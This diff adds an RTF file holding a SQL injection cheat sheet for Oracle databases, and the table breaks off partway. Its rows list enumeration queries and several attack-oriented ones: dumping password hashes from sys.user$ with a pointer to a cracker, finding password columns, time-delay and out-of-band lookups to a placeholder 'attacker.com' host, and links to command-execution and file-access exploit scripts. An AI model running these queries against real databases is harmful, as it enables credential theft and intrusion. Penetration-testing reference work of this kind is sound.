@@ -1,0 +1,276 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 ArialMT;}
+{\colortbl;\red255\green255\blue255;\red59\green65\blue68;\red225\green225\blue225;\red17\green135\blue173;
+}
+\paperw11900\paperh16840\margl1440\margr1440\vieww17280\viewh10460\viewkind0
+\deftab720
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf2 \expnd0\expndtw0\kerning0
+Version\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT banner FROM v$version WHERE banner LIKE \'91Oracle%\'92;\
+SELECT banner FROM v$version WHERE banner LIKE \'91TNS%\'92;\
+SELECT version FROM v$instance;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Comments\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT 1 FROM dual \'97 comment\
+\'96 NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name \'91dual\'92 when we\'92re not actually selecting from a table.\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Current User\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT user FROM dual\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT username FROM all_users ORDER BY username;\
+SELECT name FROM sys.user$; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Password Hashes\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT name, password, astatus FROM sys.user$ \'97 priv, <= 10g.\'a0 astatus tells you if acct is locked\
+SELECT name,spare4 FROM sys.user$ \'97 priv, 11g\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \'a0Password Cracker\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.red-database-security.com/software/checkpwd.html"}}{\fldrslt \cf4 checkpwd}} will crack the DES-based hashes from Oracle 8, 9 and 10.\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Privileges\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT * FROM session_privs; \'97 current privs\
+SELECT * FROM dba_sys_privs WHERE grantee = \'91DBSNMP\'92; \'97 priv, list a user\'92s privs\
+SELECT grantee FROM dba_sys_privs WHERE privilege = \'91SELECT ANY DICTIONARY\'92; \'97 priv, find users with a particular priv\
+SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List DBA Accounts\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = \'91YES\'92; \'97 priv, list DBAs, DBA roles\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Current Database\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT global_name FROM global_name;\
+SELECT name FROM v$database;\
+SELECT instance_name FROM v$instance;\
+SELECT SYS.DATABASE_NAME FROM DUAL;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Databases\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT DISTINCT owner FROM all_tables; \'97 list schemas (one per user)\
+\'96 Also query TNS listener for other databases.\'a0 See {\field{\*\fldinst{HYPERLINK "http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html"}}{\fldrslt \cf4 tnscmd}} (services | status).\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Columns\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT column_name FROM all_tab_columns WHERE table_name = \'91blah\'92;\
+SELECT column_name FROM all_tab_columns WHERE table_name = \'91blah\'92 and owner = \'91foo\'92;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Tables\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT table_name FROM all_tables;\
+SELECT owner, table_name FROM all_tables;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Find Tables From Column Name\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE \'91%PASS%\'92; \'97 NB: table names are upper case\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Select Nth Row\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; \'97 gets 9th row (rows numbered from 1)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Select Nth Char\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT substr(\'91abcd\'92, 3, 1) FROM dual; \'97 gets 3rd character, \'91c\'92\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Bitwise AND\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT bitand(6,2) FROM dual; \'97 returns 2\
+SELECT bitand(6,1) FROM dual; \'97 returns0\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 ASCII Value -> Char\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT chr(65) FROM dual; \'97 returns A\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Char -> ASCII Value\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT ascii(\'91A\'92) FROM dual; \'97 returns 65\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Casting\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CAST(1 AS char) FROM dual;\
+SELECT CAST(\'921\uc0\u8242  AS int) FROM dual;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 String Concatenation\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT \'91A\'92 || \'91B\'92 FROM dual; \'97 returns AB\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 If Statement\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; \'97 doesn\'92t play well with SELECT statements\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Case Statement\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; \'97 returns 1\
+SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; \'97 returns 2\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Avoiding Quotes\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT chr(65) || chr(66) FROM dual; \'97 returns AB\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Time Delay\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 BEGIN DBMS_LOCK.SLEEP(5); END; \'97 priv, can\'92t seem to embed this in a SELECT\
+SELECT UTL_INADDR.get_host_name(\'9210.0.0.1\uc0\u8242 ) FROM dual; \'97 if reverse looks are slow\
+SELECT UTL_INADDR.get_host_address(\'91blah.attacker.com\'92) FROM dual; \'97 if forward lookups are slow\
+SELECT UTL_HTTP.REQUEST(\'91http://google.com\'92) FROM dual; \'97 if outbound TCP is filtered / slow\
+\'96 Also see {\field{\*\fldinst{HYPERLINK "http://technet.microsoft.com/en-us/library/cc512676.aspx"}}{\fldrslt \cf4 Heavy Queries}} to create a time delay\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Make DNS Requests\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT UTL_INADDR.get_host_address(\'91google.com\'92) FROM dual;\
+SELECT UTL_HTTP.REQUEST(\'91http://google.com\'92) FROM dual;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Command Execution\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql"}}{\fldrslt \cf4 Java}}\cf4  \cf2 can be used to execute commands if it\'92s installed.{\field{\*\fldinst{HYPERLINK "http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql"}}{\fldrslt \cf4 ExtProc}} can sometimes be used too, though it normally failed for me. \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Local File Access\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql"}}{\fldrslt \cf4 UTL_FILE}} can sometimes be used.\'a0 Check that the following is non-null:\
+SELECT value FROM v$parameter2 WHERE name = \'91utl_file_dir\'92;{\field{\*\fldinst{HYPERLINK "http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql"}}{\fldrslt \cf4 Java}} can be used to read and write files if it\'92s installed (it is not available in Oracle Express).\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10265\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Hostname, IP Address\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT UTL_INADDR.get_host_name FROM dual;\
+SELECT host_name FROM v$instance;\
+SELECT UTL_INADDR.get_host_address FROM dual; \'97 gets IP address\
+SELECT UTL_INADDR.get_host_name(\'9210.0.0.1\uc0\u8242 ) FROM dual; \'97 gets hostnames\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1775\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
